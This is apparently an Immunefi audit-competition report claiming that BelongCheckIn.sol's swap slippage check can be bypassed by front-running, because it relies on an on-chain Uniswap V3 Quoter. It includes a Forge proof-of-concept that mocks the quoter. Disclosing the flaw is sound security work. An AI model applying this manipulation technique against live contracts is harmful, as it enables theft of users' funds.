# 57733 sc high swapexact s slippge is not works as expected

**Submitted on Oct 28th 2025 at 14:52:36 UTC by @ox9527 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57733
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief / Intro

When `BelongCheckIn.sol::_swapExact()` is called, `amountOutMinimum` is first fetched from an on-chain quote and then calculated based on `slippageBps`.

However, when using Uniswap V3’s Quoter (or `IV3Quoter` / `swapV3Quoter`) to get the price for a specific swap path, the returned quote is calculated based on the current on-chain state of the relevant pools including the current `sqrtPriceX96` (spot price), liquidity distribution, and tick states.

An attacker can front-run `BelongCheckIn.sol::venueDeposit()` and temporarily inject large liquidity into a Uniswap V3 pool to manipulate the quoted price. As a result, `amountOutMinimum` returned by the Quoter can be smaller than expected, rendering the slippage protection ineffective and allowing the attacker to cause the victim to receive far worse execution than anticipated.

## Vulnerability Details

Relevant code excerpt:

```solidity
function _swapExact(address tokenIn, address tokenOut, address recipient, uint256 amount)
    internal
    returns (uint256 swapped)
{
    if (recipient == address(0) || amount == 0) {
        return 0;
    }

    PaymentsInfo memory _paymentsInfo = belongCheckInStorage.paymentsInfo;

    bytes memory path = _buildPath(_paymentsInfo, tokenIn, tokenOut);

    uint256 amountOutMinimum =
        IV3Quoter(_paymentsInfo.swapV3Quoter).quoteExactInput(path, amount).amountOutMin(_paymentsInfo.slippageBps); //@<
```

`amountOutMinimum` is fetched from an on-chain contract (the Quoter) instead of being based on an off-chain oracle or other non-manipulable source. Because the Quoter reflects the current on-chain pool state, it can be manipulated via front-running (temporary liquidity changes), allowing an attacker to reduce the quoted amount and bypass slippage protections.

## Impact Details

Escrow (or the contract performing the swap) can receive significantly fewer assets than expected — enabling theft of value from users.

## Proof of Concept

<details>

<summary>PoC Solidity test contract (Forge)</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {BelongCheckIn} from "../contracts/v2/platform/BelongCheckIn.sol";
import "../contracts/v2/Structures.sol";
import {CreditToken} from "../contracts/v2/tokens/CreditToken.sol";
import {Factory} from "../contracts/v2/platform/Factory.sol";
import {Escrow} from "../contracts/v2/periphery/Escrow.sol";
import {Staking} from "../contracts/v2/periphery/Staking.sol";
import "node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test} from "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IV3Factory} from "../contracts/v2/interfaces/IV3Factory.sol";
import {IV3Router} from "../contracts/v2/interfaces/IV3Router.sol";
import {IV3Quoter} from "../contracts/v2/interfaces/IV3Quoter.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "Mock") {
    }
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract BelongTest is Test {
    Staking public staking;
    BelongCheckIn public bc;
    MockToken public token1;
    MockToken public token2;
    address public swapV3Factory;
    address public swapV3Router;
    address public swapV3Quoter;
    address public wNativeCurrency;
    CreditToken public venueToken;
    CreditToken public promoterToken;
    uint256 private signerPrivateKey = 0xA11CE;
    address private signer = vm.addr(signerPrivateKey);
    uint256 public amountMinOut;

    function setUp() public {
        bc = new BelongCheckIn();
        token1 = new MockToken();
        token2 = new MockToken();

        staking = new Staking();
        staking.initialize(address(this), address(this), address(token2));

        venueToken = new CreditToken();
        ERC1155Info memory info1155;
        info1155.name="name";
        info1155.symbol = "sym";
        info1155.defaultAdmin = address(this);
        info1155.manager = address(this);
        info1155.minter = address(bc);
        info1155.burner = address(this);
        info1155.uri = "";
        info1155.transferable = true;

        venueToken.initialize(info1155);
        //comment the _disableInitializers in the BelongCheckIn contract
        //to run this POC.
        // constructor() {
            // _disableInitializers();
        // }

        BelongCheckIn.PaymentsInfo memory info;
        info.slippageBps = 100;
        info.swapPoolFees = 100;
        info.swapV3Factory = address(this);
        info.swapV3Router = address(this);
        info.swapV3Quoter = address(this);
        info.wNativeCurrency = wNativeCurrency;
        info.usdc = address(token1);
        info.long = address(token2);
        info.maxPriceFeedDelay = 100;

        bc.initialize(address(this),info);

        BelongCheckIn.Contracts memory _contracts;
        _contracts.factory = Factory(address(this));
        _contracts.escrow = Escrow(address(this));
        _contracts.staking = Staking(staking);
        _contracts.venueToken = venueToken;
        _contracts.promoterToken = promoterToken;

        bc.setContracts(_contracts);
    }

    function nftFactoryParameters() public view returns (Factory.FactoryParameters memory) {
        Factory.FactoryParameters memory factoryParameters;
        factoryParameters.maxArraySize = 100;
        factoryParameters.signerAddress = signer;

        return factoryParameters;
    }

    function getPool(address a,address b,uint24 fee) public view returns (address pool) {
        pool = address(this);
    }

    function quoteExactInput(bytes calldata path,uint256 amountIn) public returns (uint256){
        if(amountMinOut == 0) {
            amountMinOut = amountIn;
        }else{
            amountMinOut = amountIn / 2; 
        }
        return amountMinOut;
    }

    function exactInput(IV3Router.ExactInputParamsV1 calldata swapParamsV1) public returns (uint256 amountOutMinimum) {
        amountOutMinimum = amountMinOut;
        token2.mint(msg.sender,amountOutMinimum);
    }

    function venueDeposit(address venue, uint256 depositedUSDCs, uint256 depositedLONGs) external  {
    }

    function test_POC_Slippage() public {
        address alice = address(0x1001);

        token1.mint(alice,10e18);

        vm.prank(alice);
        token1.approve(address(bc), type(uint256).max);

        //alice generate sigs from signer.
        VenueRules memory rules;
        rules.paymentType = PaymentTypes.USDC;
        rules.bountyType = BountyTypes.VisitBounty;
        rules.longPaymentType = LongPaymentTypes.AutoStake;

        VenueInfo memory info;
        info.rules = rules;
        info.venue = alice;
        info.amount = 1e18;
        info.referralCode = "";
        info.uri = "";

        //alice get signatures from signer.
        bytes32 toSign = keccak256(
            abi.encodePacked(info.venue, info.referralCode, info.uri, block.chainid)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, toSign);
        bytes memory signature = abi.encodePacked(r, s, v);
        info.signature = signature;

        uint256 snapshotId = vm.snapshot();

        vm.startPrank(alice);
        bc.venueDeposit(info);

        console2.log("escrow received assets before:",token2.balanceOf(address(bc)));

        vm.revertTo(snapshotId);
        //attacker front-run swapPool result in quote return less token than expected.
        amountMinOut = 5e17;
        vm.startPrank(alice);
        bc.venueDeposit(info);

        console2.log("escrow received assets after:",token2.balanceOf(address(bc)));
    }
}
```

</details>

<details>

<summary>PoC Output</summary>

```shell
[PASS] test_POC_Slippage() (gas: 751672)
Logs:
  escrow received assets before: 5000000000000000000
  escrow received assets after: 2500000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.43ms (3.31ms CPU time)

Ran 1 test suite in 149.90ms (9.43ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

</details>

## References

* (No additional references provided in the submitted report.)
